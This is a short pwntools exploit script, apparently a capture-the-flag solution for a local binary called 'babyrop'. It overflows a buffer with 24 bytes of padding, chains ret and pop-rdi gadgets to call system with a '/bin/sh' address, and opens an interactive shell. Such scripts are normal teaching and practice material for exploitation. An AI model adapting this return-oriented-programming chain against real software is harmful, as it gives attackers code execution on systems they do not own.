from pwn import *

e = ELF('./babyrop')
p = process('./babyrop')

system_addr = 0x400490 #e.plt['system']
binsh_addr = 0x601048
pop_rdi = 0x00400683
ret_addr = 0x00400479

print hex(system_addr)

payload = 'A'*24
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(0xffffffffffffffff)
#payload += 'A'*8
#payload += p64(binsh_addr)

#print p.recvuntil("What's your name? ")
p.sendline(payload)
p.interactive()
#print p.recv()
